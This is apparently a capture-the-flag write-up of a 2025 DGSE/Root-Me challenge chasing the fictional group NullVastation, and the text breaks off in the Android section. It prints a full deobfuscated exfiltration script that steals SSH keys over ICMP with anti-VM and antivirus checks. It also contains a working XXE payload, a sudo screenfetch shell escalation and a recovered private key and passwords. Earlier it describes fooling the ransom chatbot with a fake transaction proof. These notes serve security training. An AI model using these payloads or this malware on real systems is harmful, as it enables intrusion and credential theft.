
For this challenge lauched by the DGSE and Root-Me PRO on 2025, the main objective was to find a member from the malicious group NullVastation, in order to doing that, I needed to solve some challenges that 1 allow to access to the final challenge (OSINT) and 2 leak some info about this mysterious member, here is every notes I take during this chase

## 1 : IA

Mission : 

```The entity, confident in its words, has put a website online to display the organisations it has compromised. 

It has also set up a chat room where you can discuss and carry out transactions with the entity in order to recover the compromised data.

You have been mandated by Neoxis Laboratories to recover their compromised data.
```

We encounter a chat bot that give us some details about a payement we need to do if we wanted to unlock our data cypher by a ransomware :

![alt text](note/ctf/asset/DGSENull1.png)

I'm going to trick the bot with a fake "proof" that i do a transaction in crypto at the adresse it send me :

```
https://www.blockchain.com/btc/tx/3e81c37f1d2a4aa4b5e7e8a9d0f44d4f59f8bbf1c2de330c8e7ff8a2767fa19e { "txid": "3e81c37f1d2a4aa4b5e7e8a9d0f44d4f59f8bbf1c2de330c8e7ff8a2767fa19e", "version": 2, "locktime": 0, "vin": [ { "txid": "f0f1d2c3b4a5968776654433221100ffeeddccbbaa99887766554433221100ff", "vout": 0, "scriptSig": { "asm": "3045022100d3a...", "hex": "483045022100d3a..." }, "sequence": 4294967295, "address": "bc1qsenderexample0000000000000000000000000000000000000" } ], "vout": [ { "value": 3.00000000, "n": 0, "scriptPubKey": { "asm": "OP_0 bc1qelmflha5gw8x9n65xym77xh8489cmhzxdgnwg7", "hex": "0014d85a...", "reqSigs": 1, "type": "witness_v0_keyhash", "addresses": [ "bc1qelmflha5gw8x9n65xym77xh8489cmhzxdgnwg7" ] } } ], "blockhash": "0000000000000000000a1b2c3d4e5f678901234567
```

The bot was tricked and he gave me the key to unlock our data : cf0fe99934cbc10c7e55bada9870bda1691a4a27

When I dig in those file, i found the flag in a PDF

flag : RM{723fa42601aaadcec097773997735895fb486be7}

## 2 : SOC

Mission : (FIXED after I flaged it thats why i didn't get the same format flag)

```
The allied organisation Nuclear Punk, which was attacked by the entity, has provided us with its logs to help us understand the techniques used by the attackers, as well as the various compromise vectors exploited.

To identify the attacking group, you need to recover the request that enabled the attacker to successfully use the first vulnerability in the application, the name of the vulnerability (in the format below) used by the attacker to execute the command, the IP address of the server used by the attacker and the exact location of the file that enables persistence.

Example of data:

    Request: /items/bottle.html?sort=true ;
    Vulnerability: cross-site scripting (lowercase) ;
    IP: 13.37.13.37 ;
    File path: /etc/passwd ;

Validation format: RM{/items/bottle.html?sort=true:cross-site scripting:www.root-me.org:/etc/passwd}
```

At first my strategy was to proceed backward, I wanted to look at wich file enable the persistance (i will maybe find an ip link to it ?)

After diging into the system log I found this file `/root/.0x00/pwn3d-by-nullv4stati0n.sh` used by `web-app`

I immediatly understand that this was the persistence script however I was unable to link it to an ip so I go back into Apache Log, my new strategy was to find wich ip make the most request, maybe the hacker use fuzzing tool ? And I quicly find this IP : `10.143.17.101`

after analyzing this IP actions, i was then able to now wich vulnerability were used :

He first use the Improper Control of Filename for Include/Require Statement (**CWE-98**) for his LFI

Then he use it for uploading malicious code (**CWE-434**) in order to execute command.

Like that he was able to download `s1mpl3-r3vsh3ll-vps.sh` from `163.172.67.201` (execution fo code **CWE-78**)

for the flag i needed the CWE of the first and second vulnerability used instead of Request and vulnerabilty :

RM{CWE-98:CWE-434:163.172.67.201:/root/.0x00/pwn3d-by-nullv4stati0n.sh}

## 3 : FORENSIC

Mission :

```
The news has just broken that the famous Quantumcore company has been compromised, allegedly as a result of a downloaded executable. Luckily - and thanks to good cyber reflexes - a system administrator managed to recover an image of the suspected virtual machine, as well as a network capture file (PCAP) just before the attacker completely covered his tracks.

It’s up to you to analyse these elements and understand what really happened.

Your mission: to identify the intrusion vector, trace the attacker’s actions and evaluate the compromised data. You have at your disposal:

    The image of the compromised VM
    The PCAP file containing a portion of the suspect network traffic
    User: johndoe
    Password: MC2BSNRbgk

The clock is ticking, the pressure is mounting and every minute counts. Your move, analyst.
```

I did it like a barbarian the first time but I realized quickly that there was a more interresting way of solving it.

#### EZ-Flag

by analysing the history with `journalctl | grep COMMAND` (because history was cleaned)

i found this :

![alt text](note/ctf/asset/DGSENull1.png)

Quickly after I found out that this file was erased, but if it was recent then it sould be in memory ?

so i do `sudo strings /dev/sda | grep -i 'RM{'` (Because I know the format) and Bingo : RM{986b8674b18e7f3c36b24cf8c8195b36bba01d61}

#### True Flag

By digging into cron.d, I found a hidden task that execute a .pyc, this sound interesting !

this pyc cypher data and send them to an adress, I must find a way to decypher the data (contain into the capture file), i used this site to decompile : https://pylingual.io/view_chimera?identifier=d2fe70b7d095ec2c8b7ba0bd005606dac730939e40d16a1d9650ea1bf9342b18 (the name nightshade.py will be important !)

we can see an obfuscate script and here is the desobfuscate version :

```python
import os
import subprocess
import psutil
from base64 import b64decode
from Crypto.Cipher import AES

# === Configuration ===

AES_KEY = bytes.fromhex("e8f93d68b1c2d4e9f7a36b5c8d0f1e2a")
AES_IV  = bytes.fromhex("1f2d3c4b5a69788766554433221100ff")
DEST_IP = "vastation.null"  # result of decrypt_hex("37e0f8f92c71f1c3f047f43c13725ef1")

# === Utils ===

def pad(data: bytes) -> bytes:
    pad_len = 16 - (len(data) % 16)
    return data + bytes([pad_len] * pad_len)

def encrypt_block(block: bytes) -> bytes:
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    return cipher.encrypt(pad(block))

def b64(s: str) -> str:
    return b64decode(s).decode()

# === Anti-VM / AV checks ===

def is_vm() -> bool:
    try:
        product = open("/sys/class/dmi/id/product_name").read().strip().lower()
        indicators = [
            "virtualbox",  # VmlydHVhbEJveA==
            "kvm",         # S1ZN
            "qemu",        # UVFNVQ==
            "bochs"        # Qm9jaHM=
        ]
        return any(vm in product for vm in indicators)
    except:
        return False

def is_av_running() -> bool:
    av_targets = ["clamd", "avgd", "sophos", "eset", "rkhunter"]
    try:
        for proc in psutil.process_iter(attrs=["name"]):
            pname = (proc.info["name"] or "").lower()
            if any(av in pname for av in av_targets):
                return True
    except:
        pass
    return False

# === Exfiltration ===

def exfil_file(filepath: str, dst_ip: str):
    if not os.path.exists(filepath):
        return

    with open(filepath, "rb") as f:
        data = f.read()

    # Split into 15-byte chunks
    chunks = [data[i:i+15] for i in range(0, len(data), 15)]

    for chunk in chunks:
        try:
            encrypted = encrypt_block(chunk).hex()
            # Equivalent of: ping -c 1 -p <hex> <dst_ip>
            cmd = ["ping", "-c", "1", "-p", encrypted, dst_ip]
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            continue

# === Main ===

def main():
    if is_vm():
        print("[!] Virtual machine detected. Exiting.")
        return
    if is_av_running():
        print("[!] Antivirus detected. Exiting.")
        return

    # Exfiltration targets
    files = [
        "/root/.secret",
        os.path.expanduser("~/.ssh/id_rsa"),
        "/root/.ssh/id_rsa"
    ]

    for file in files:
        if os.path.exists(file):
            exfil_file(file, DEST_IP)

    # Clean-up attempt
    try:
        if os.path.exists("/root/.secret"):
            os.remove("/root/.secret")
    except:
        pass

if __name__ == "__main__":
    main()
```

So the cypher data are exfiltrated chunk by chunk with icmp protocol and the capture contains those chunk

lets decypher ! :

```python
from scapy.all import rdpcap, IP, ICMP, Raw
from Crypto.Cipher import AES

KEY = bytes.fromhex("e8f93d68b1c2d4e9f7a36b5c8d0f1e2a")
IV = bytes.fromhex("1f2d3c4b5a69788766554433221100ff")

EXFIL_IP = "192.168.1.10"

def unpad(data):
    pad_len = data[-1]
    return data[:-pad_len] if 0 < pad_len <= 16 else data

def decrypt_block(block):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return unpad(cipher.decrypt(block))

def extract_decrypted_data(pcap_path):
    packets = rdpcap(pcap_path)
    seen = set()
    output = b""

    for pkt in packets:
        if pkt.haslayer(IP) and pkt.haslayer(ICMP) and pkt.haslayer(Raw):
            if pkt[IP].dst != EXFIL_IP:
                continue

            raw = bytes(pkt[Raw].load)
            data = raw[16:]  # Skip first 16 bytes (timestamp + padding)

            # Process every 16-byte AES block
            for i in range(0, len(data), 16):
                chunk = data[i:i+16]
                if len(chunk) != 16:
                    continue
                if chunk in seen:
                    continue
                seen.add(chunk)
                dec = decrypt_block(chunk)
                if dec:
                    output += dec

    with open("recovered.bin", "wb") as f:
        f.write(output)

    print(f"[+] Decrypted {len(output)} bytes from {EXFIL_IP} → recovered.bin")

if __name__ == "__main__":
    extract_decrypted_data("capture_victim.pcap")
```

and the result :

```
RM{986b8674b18e7f3c36b24cf8c8195b36bba01d61}
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

## 4 : Pentest

Mission :

```
One of your intelligence teams has managed to identify an application that is part of the entity’s attack chain. Your mission is to break into this server and retrieve the next attack plans.
```

I start by doing a nmap on the target.

```bash
nmap -sV 163.172.67.183 -Pn   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-22 13:36 CEST
Stats: 0:01:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 96.28% done; ETC: 13:37 (0:00:02 remaining)
Stats: 0:01:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 98.78% done; ETC: 13:37 (0:00:01 remaining)
Nmap scan report for 163-172-67-183.rev.poneytelecom.eu (163.172.67.183)
Host is up (0.042s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE    SERVICE    VERSION
21/tcp  open     tcpwrapped
25/tcp  filtered smtp
80/tcp  open     http       Werkzeug httpd 3.1.3 (Python 3.11.2)
443/tcp open     tcpwrapped
554/tcp open     rtsp?

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.95 seconds
```

(not shown here but another scan give the ssh open at 22222)

okay so we already know this was a web-site

lets analyse it :

![alt text](note/ctf/asset/DGSENull3.png)

When we upload some random .docx it will add a field named VictimID into docProps/app.xml, this can be founded by unzipping the .docx file (yes it is possible to unzip a .docx to check his componenent)

and if we wanted to identify the document it would print the value of this field :

![alt text](note/ctf/asset/DGSENull4.png)

so it might be vulnerable to xxe !

lets change the app.xml and rezip it :

XXE PAYLOAD : 
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties"
xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">
<VictimID>&xxe;</VictimID>
<Template/>
<TotalTime>0</TotalTime>
<Application>LibreOffice/24.8.5.2$Linux_X86_64 LibreOffice_project/480$Build-2</Application>
<AppVersion>15.0000</AppVersion>
<Pages>1</Pages>
<Words>6</Words>
<Characters>23</Characters>
<CharactersWithSpaces>27</CharactersWithSpaces>
<Paragraphs>2</Paragraphs>
</Properties>
```

and as exepected I'm able to extract file passwd exfil :

![alt text](note/ctf/asset/DGSENull5.png)

Okay but doesn't give me access to the server i can only dump file, maybe some of them will be interresting !

app.py exfil :

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import shutil
import zipfile
import uuid
from flask import Flask, request, redirect, send_file, render_template, jsonify
from lxml import etree

app = Flask(__name__)

UPLOAD_FOLDER = '/dev/shm/uploads'
TMP_FOLDER = '/dev/shm/work'

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(TMP_FOLDER, exist_ok=True)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        if 'file' not in request.files:
            return jsonify({"error": "No file part"}), 400
        file = request.files['file']
        if file.filename == '':
            return jsonify({"error": "No selected file"}), 400
        if not file.filename.endswith('.docx'):
            return jsonify({"error": "Only .docx files are allowed"}), 400

        doc_id = str(uuid.uuid4())
        work_dir = os.path.join(TMP_FOLDER, doc_id)
        os.makedirs(work_dir)
        docx_path = os.path.join(UPLOAD_FOLDER, f"{doc_id}.docx")
        output_path = os.path.join(UPLOAD_FOLDER, f"{doc_id}_signed.docx")

        try:
            file.save(docx_path)
            # Unzip
            with zipfile.ZipFile(docx_path, 'r') as zip_ref:
                zip_ref.extractall(work_dir)

            # Modify app.xml
            app_xml_path = os.path.join(work_dir, 'docProps', 'app.xml')
            if os.path.exists(app_xml_path):
                tree = etree.parse(app_xml_path)
                root = tree.getroot()
                ns = {
                    'default': 'http://schemas.openxmlformats.org/officeDocument/2006/extended-properties'
                }
                if root.find('default:VictimID', namespaces=ns) is None:
                    victim = etree.Element('{http://schemas.openxmlformats.org/officeDocument/2006/extended-properties}VictimID')
                    victim.text = "victim-" + str(uuid.uuid4())
                    root.insert(0, victim)
                    tree.write(app_xml_path, xml_declaration=True, encoding='UTF-8', standalone='yes')
            else:
                return jsonify({"error": "app.xml not found in document"}), 400

            # Rezip
            with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as docx:
                for root_dir, dirs, files in os.walk(work_dir):
                    for file in files:
                        full_path = os.path.join(root_dir, file)
                        rel_path = os.path.relpath(full_path, work_dir)
                        docx.write(full_path, rel_path)

            return send_file(output_path, as_attachment=True)

        finally:
            # Cleanup
            shutil.rmtree(work_dir, ignore_errors=True)
            if os.path.exists(docx_path): os.remove(docx_path)
            if os.path.exists(output_path): os.remove(output_path)

    return render_template("index.html")

@app.route('/read', methods=['POST'])
def read_victim_id():
    if 'file' not in request.files:
        return jsonify({"error": "No file part"}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({"error": "No selected file"}), 400
    if not file.filename.endswith('.docx'):
        return jsonify({"error": "Only .docx files are allowed"}), 400

    doc_id = str(uuid.uuid4())
    work_dir = os.path.join(TMP_FOLDER, doc_id)
    docx_path = os.path.join(UPLOAD_FOLDER, f"{doc_id}_read.docx")

    try:
        os.makedirs(work_dir)
        file.save(docx_path)

        with zipfile.ZipFile(docx_path, 'r') as zip_ref:
            zip_ref.extractall(work_dir)

        app_xml_path = os.path.join(work_dir, 'docProps', 'app.xml')
        victim_id = None

        if os.path.exists(app_xml_path):
            # Enable full XXE support
            parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=False)

            try:
                tree = etree.parse(app_xml_path, parser=parser)
                root = tree.getroot()

                ns = {
                    'default': 'http://schemas.openxmlformats.org/officeDocument/2006/extended-properties'
                }

                victim_node = root.find('default:VictimID', namespaces=ns)

                if victim_node is not None:
                    victim_id = victim_node.text.strip()

                    # EXFILTRATION: Print it or store it
                    print("[+] Exfiltrated VictimID content:")
                    print(victim_id)

            except etree.XMLSyntaxError as e:
                print(f"[!] XML parser failed: {e}")

        if victim_id:
            return jsonify({"victim_id": victim_id})
        else:
            return jsonify({"error": "VictimID not found in document."}), 404

    finally:
        shutil.rmtree(work_dir, ignore_errors=True)
        if os.path.exists(docx_path): os.remove(docx_path)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=1337, debug=True)
```

nothing interresting here, I also see in the passwd extract that there is 3 user , I might be able to exctract some .bash_history ?

.bash_history of document_user : 

```bash
id
htop
cat /etc/passwd
sudo su
ps aux | grep python
rm -rf /tmp/*
ip --brief --color a
whoami
uname -a
cat /plans/next-op.txt
ls /var/log/
vim .bashrc
ls -la
cd /app
python3 app.py
pip install -r requirements.txt
export FLASK_ENV=production
flask run --host=0.0.0.0 --port=5000
echo "cABdTXRyUj5qgAEl0Zc0a" >> /tmp/exec_ssh_password.tmp
ps aux | grep flask
cd templates/
vim index.html
vim app.py
export SECRET_KEY=$(head -n50 /dev/null | xxd | sha256sum | awk '{print $1}')
grep -RiF "docx" .
ls -la /tmp/
vim README.md
clear
ls -lah /tmp
exit
vim /etc/hosts
```

exec refer to the executor account and i now know a ssh password to access the machine ! : `cABdTXRyUj5qgAEl0Zc0a`

after analysing existing process i found this :

```bash
root           1  0.0  0.0   3928  2776 ?        Ss   Apr29   0:04 /bin/bash /entrypoint.sh                                                                                                 
executor  317867  0.0  0.0  18088  5492 ?        S    07:47   0:00  |   _ sshd: executor@pts/2
executor  317868  0.0  0.0   4192  3076 pts/2    Ss   07:47   0:00  |       _ -bash
root      318033  0.0  0.0   7024  4052 pts/2    S+   07:48   0:00  |           _ sudo -u administrator /usr/bin/screenfetch -o /bin/bash
root      318034  0.0  0.0   7024     0 pts/3    Ss   07:48   0:00  |               _ sudo -u administrator /usr/bin/screenfetch -o /bin/bash
adminis+  318035  0.0  0.0   4060  2704 pts/3    S    07:48   0:00  |                   _ bash /usr/bin/screenfetch -o /bin/bash
adminis+  318038  0.0  0.0   4192  3404 pts/3    S+   07:48   0:00  |                       _ /bin/bash
executor  341474  0.0  0.0  17868  7008 ?        S    11:39   0:00  |   _ sshd: executor@pts/0
executor  341475  0.0  0.0   4192  3448 pts/0    Ss   11:39   0:00  |       _ -bash
root      341612  0.0  0.0   7028  4416 pts/0    S+   11:39   0:00  |           _ sudo -u administrator screenfetch -E -o /bin/bash
root      341613  0.0  0.0   7028   468 pts/4    Ss   11:39   0:00  |               _ sudo -u administrator screenfetch -E -o /bin/bash
adminis+  341614  0.0  0.0   4060  3172 pts/4    S    11:39   0:00  |                   _ bash /usr/bin/screenfetch -E -o /bin/bash
adminis+  341617  0.0  0.0   4192  3580 pts/4    S+   11:39   0:00  |                       _ /bin/bash
executor  344274  0.0  0.0  17868  7108 ?        S    12:30   0:00  |   _ sshd: executor@pts/1
executor  344275  0.0  0.0   4192  3600 pts/1    Ss   12:30   0:00  |       _ -bash
root      344823  0.0  0.0   7028  4472 pts/1    S+   12:35   0:00  |           _ sudo -u administrator screenfetch -E -o /bin/bash
root      344824  0.0  0.0   7028   464 pts/5    Ss   12:35   0:00  |               _ sudo -u administrator screenfetch -E -o /bin/bash
adminis+  344825  0.0  0.0   4060  3112 pts/5    S    12:35   0:00  |                   _ bash /usr/bin/screenfetch -E -o /bin/bash
adminis+  344828  0.0  0.0   4192  3612 pts/5    S+   12:35   0:00  |                       _ /bin/bash
executor  346018  0.0  0.0  17868  6844 ?        S    12:59   0:00  |   _ sshd: executor@pts/6
executor  346019  0.0  0.0   4192  3372 pts/6    Ss   12:59   0:00  |       _ -bash
root      346132  0.0  0.0   7028  4428 pts/6    S+   13:00   0:00  |           _ sudo -u administrator screenfetch -o bash -s
root      346133  0.0  0.0   7028   468 pts/7    Ss   13:00   0:00  |               _ sudo -u administrator screenfetch -o bash -s
adminis+  346134  0.0  0.0   4060  3028 pts/7    S    13:00   0:00  |                   _ bash /usr/bin/screenfetch -o bash -s
adminis+  346137  0.0  0.0   4192  3528 pts/7    S+   13:00   0:00  |                       _ bash
executor  346397  0.0  0.0  17868  6976 ?        S    13:05   0:00  |   _ sshd: executor@pts/8
executor  346398  0.0  0.0   4612  3836 pts/8    Ss   13:05   0:00  |       _ -bash
executor  346562  1.3  0.0  95840 14284 pts/8    S+   13:06   0:00  |           _ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
executor  346563  1.0  0.0   3532  2704 pts/8    S+   13:06   0:00  |           _ sh
executor  349521  0.0  0.0   3532  1048 pts/8    S+   13:06   0:00  |               _ sh
executor  349522  0.0  0.0   8540  4244 pts/8    R+   13:06   0:00  |               |   _ ps fauxwww
executor  349525  0.0  0.0   3532  1048 pts/8    S+   13:06   0:00  |               _ sh
root          18  0.0  0.0   5880  2932 ?        S    Apr29   0:00 su - document-user -c cd /app && flask run --host=0.0.0.0 --port=5000
documen+      19  0.0  0.0   2580   832 ?        Ss   Apr29   0:00  _ -sh -c cd /app && flask run --host=0.0.0.0 --port=5000
documen+      22 15.1  0.0 6264120 27752 ?       Sl   Apr29 1780:04      _ /usr/bin/python3 /usr/local/bin/flask run --host=0.0.0.0 --port=5000
adminis+  231846  0.0  0.0 110664 21352 ?        S    May06   0:07 python3 /dev/shm/flask
```

i can pass command to screenfetch, this might be useful if i can execute it with sudo and nopassword as another account, lets find out !

```bash
executor@document-station:~$ sudo -l
Matching Defaults entries for executor on document-station:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User executor may run the following commands on document-station:
    (administrator) NOPASSWD: /usr/bin/screenfetch
```

Perfect , I can now pass as an admin ! : `sudo -u administrator /usr/bin/screenfetch -o screenCommand=/bin/bash -s`

now i can see files contain in administrator :

```bash
administrator@document-station:~$ ls -la
total 268
drwxr-xr-x 1 administrator administrator   4096 Apr 29 08:46 .
drwxr-xr-x 1 root          root            4096 Apr 29 08:46 ..
lrwxrwxrwx 1 root          root               9 Apr 29 08:46 .bash_history -> /dev/null
-rw-r--r-- 1 administrator administrator    220 Mar 29  2024 .bash_logout
-rw-r--r-- 1 administrator administrator   3526 Mar 29  2024 .bashrc
-rw-r--r-- 1 administrator administrator    807 Mar 29  2024 .profile
-rw-r----- 1 administrator administrator 239860 Mar 26 17:00 logo.jpg
-rw-r----- 1 administrator administrator   4229 Apr  2 11:29 vault.kdbx
```

why would a logo should be stocked here ? also the vault is propably the more interresting thing !

I download the logo and the vault and of course it is locked...

but then i analyse the logo :

```
strings logo.jpg
JFIF
Exif
VullVastation secret
Silence the noise, embrace the void
1AQa
```

I try to unlock the vault with this file and it worked !

```
LGSA5l1%YHngd&GbjxR4Or operator ssh
RM{f5289180cb760ca5416760f3ca7ec80cd09bc1c3} flag
token:abcd1234 token old-gitlab
graf1234 graphana
qa123vpn vpn
Aws123456789! AWS
```

there were also some interresting notes :

```
[NULLVASTATION OPS - INTERNAL USE ONLY]

=== PHASE 2 - Q2 2025 ===

Primary Objective:
- Infiltrate and deploy payload within Tier-1 suppliers of aerospace sector.

Initial Access Strategy:
- Spear-phishing via spoofed procurement requests (template: "contract_renewal_0425.docx")
- Document contains FUD macro loader 
- Payload: new custom variant of SPECTRECRYPT v4 (embedded CobaltStrike beacon)

Persistence Plan:
- Abuse existing SCCM agents + GPOs
- Deploy signed drivers (via stolen cert from last week's FIN7 drop)

Ransom Strategy:
- Triple extortion:
    - File encryption (AES + ²)
    - Leak sensitive R&D docs (via Tor)
    - DDoS threat to production lines if unpaid in 5d

Timeline:
- Week 28: Initial access validation
- Week 29: Payload testing via QA share
- Week 30: Full deploy and encryption trigger
- Week 31: Public leak and ransom notes drop

Tools:
- NEW INTERNAL TOOL: "Document Tracker" → used to sign and arm decoy engineering reports
- Custom loader for airgapped lateral move (embedded in CAD viewer plugin)

[!!!] Notes:
- DO NOT reuse the same infrastructure as previously*.
- Ensure all dropper domains are burned post-deploy.

-- Nullvastation Core | 21.03.2025
```

```
SSH password for the attacking machine. The IP address changes regularly, please refer to the last operation to obtain it.
```

## 5 : ANDROID

Mission :

```
During an arrest at the home of one of the previously identified attackers, the team seized a Google tablet used for their communications.

During its analysis, a chat application appeared to be encrypted, making it impossible to access and discover its contents.
```

even before trully analyse the application, by using android studio and jadx i was able to use debug and intercept the encrypted message :

```JSON
{"messages":[{"content":"M2geCVKOzPlyug9p9DvthxPip0oe9BPiT2sDfFhWy7iC3+JQI4SfO7+SLAlFSUmu8LoGj1hrUWil/uNXvc+5mKBMrRNFQT8ijBK14P0Z8qA=","isEncrypted":true,"sender":"Agent-02","timestamp":"2025-04-01 08:00:00"},{"content":"//5PBsYWhHlgqhVgG1omUyevzmlErLZVsTCLO78Rbb9qBMPnsKCS5/RZ4GEdWRBPiZ4BtO5h7j2PuIutfqf7ag==","isEncrypted":true,"sender":"Agent-1337","timestamp":"2025-04-01 10:00:00"},{"content":"2uNMSnJZa5JExhYgNA+V3RAiafhuLkj8Jnr4U+lSZOrrpMWjyA13w0Do3IIPcVBgK070rmweRKX/GkCAxat4i3JfWk1UvWNSmEZbHQlFznR7VFW6FKK84iJKhiDOp8Tk","isEncrypted":true,"sender":"Agent-01","timestamp":"2025-04-02 15:30:00"},{"content":"Swz/ycaTlv3JM9iKJHaY+f1SRyKvfQ5miG6I0/tUb8bvbOO+wyU5hi+bGsmcJD3141FrmrDcBQhtWpYimospymABi3bzvPPi01rPI8pNBq8=","isEncrypted":true,"sender":"Agent-02","timestamp":"2025-04-03 13:20:00"},{"content":"NAe44oieygG7xzLQT3j0vN+0NoPNUu0TAaid9Az3IlpcKwR0lSKaPT8F4y1zpbArWFIGpgzsPZtPAwL50qocTRMG/g5u+/wcc1nxmhBjCbg=","isEncrypted":true,"sender":"Agent-04","timestamp":"2025-04-04 08:30:00"},{"content":"dfeKlZP/gIntHySBYine2YUlNiX3LjlMOLu7y9tgprFyJIIcQpfghlQXut6cJUG2wtzGBVQUm7ITdpLNeVaZjamQHhPWEtNIJE/xtFg66Klui1qCKYKSrmZ4wm1CG/ZPy4csqbM28Ur8dts7XoV5FA==","isEncrypted":true,"sender":"Agent-04","timestamp":"2025-04-05 